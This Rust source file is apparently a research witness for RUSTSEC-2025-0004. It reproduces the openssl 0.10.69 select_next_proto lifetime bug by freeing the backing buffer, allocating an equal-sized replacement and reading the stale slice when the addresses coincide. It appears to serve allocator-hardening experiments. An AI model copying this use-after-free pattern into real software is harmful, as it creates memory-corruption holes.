//! Derived A -> free -> B adapter for RUSTSEC-2025-0004.
//!
//! openssl 0.10.69 returns the selected protocol with a lifetime tied only to
//! the client list. The returned slice can therefore outlive the 64-byte
//! server buffer that backs it. This bounded adapter preserves that
//! free-then-stale-access edge, immediately requests a distinct equal-layout
//! `Replacement`, and treats victim-base address equality as the reuse oracle.
//! The stale read is exercised only after the measured collision.

#![forbid(unsafe_code)]

use openssl::ssl;
use std::hint::black_box;

const VICTIM_TYPE_ID: u64 = 0x5253_4843_0000_0001;
const VICTIM_MODULE_ID: u64 = 0x5253_4843_0000_0002;
const VICTIM_ALLOC_CALLSITE: u64 = 0x5253_4843_0000_0003;
const VICTIM_RECLAIM_CALLSITE: u64 = 0x5253_4843_0000_0004;
const PAYLOAD_SIZE: usize = 64;

// These hooks are no-ops in the standalone pinned witness. The allocator
// experiment wrapper supplies the explicitly labeled semantic identity scope
// and reports the immediately following equal-layout allocation decision.
pub(crate) fn with_vulnerability_edge_identity<R>(
    _type_id: u64,
    _module_id: u64,
    _callsite: u64,
    f: impl FnOnce() -> R,
) -> R {
    f()
}

pub(crate) fn report_vulnerability_edge_reuse_denial() {}

struct Replacement([u8; PAYLOAD_SIZE]);

// Keep the allocation helper noinline so the compiler audit sees a distinct
// critical site with the concrete owner type used by this adapter.
#[inline(never)]
fn materialize_server(seed: &[u8; PAYLOAD_SIZE]) -> Vec<u8> {
    seed.to_vec()
}

#[inline(never)]
fn reclaim_server<T>(server: T) {
    drop(server);
}

fn main() {
    let mut seed = [b'x'; PAYLOAD_SIZE];
    seed[..3].copy_from_slice(b"\x02h2");
    // Complete the remaining wire list with one 60-byte protocol. OpenSSL
    // selects the leading h2 entry while the victim allocation stays 64 bytes.
    seed[3] = 60;
    let materialize: fn(&[u8; PAYLOAD_SIZE]) -> Vec<u8> = materialize_server;
    let server = crate::with_vulnerability_edge_identity(
        VICTIM_TYPE_ID,
        VICTIM_MODULE_ID,
        VICTIM_ALLOC_CALLSITE,
        || black_box(materialize)(&seed),
    );
    assert_eq!(server.capacity(), PAYLOAD_SIZE);

    // In openssl 0.10.69, `selected` is typed as borrowing only from the
    // static client list even though OpenSSL returns a pointer into `server`.
    let selected = ssl::select_next_proto(&server, b"\x02h2").expect("matching protocol");
    assert_eq!(selected, b"h2");
    let original_address = server.as_ptr() as usize;

    let reclaim: fn(Vec<u8>) = reclaim_server;
    crate::with_vulnerability_edge_identity(
        VICTIM_TYPE_ID,
        VICTIM_MODULE_ID,
        VICTIM_RECLAIM_CALLSITE,
        || black_box(reclaim)(server),
    );

    let replacement = Box::new(Replacement([0x42; PAYLOAD_SIZE]));
    crate::report_vulnerability_edge_reuse_denial();
    let replacement_address = (&*replacement as *const Replacement) as usize;
    eprintln!("original={original_address:#x} replacement={replacement_address:#x}");
    black_box(&replacement.0);

    if replacement_address == original_address {
        // Preserve the advisory's stale access at the measured A-to-B reuse
        // edge. The replacement bytes are valid protocol payload bytes.
        black_box(selected[0]);
    }

    drop(replacement);
}
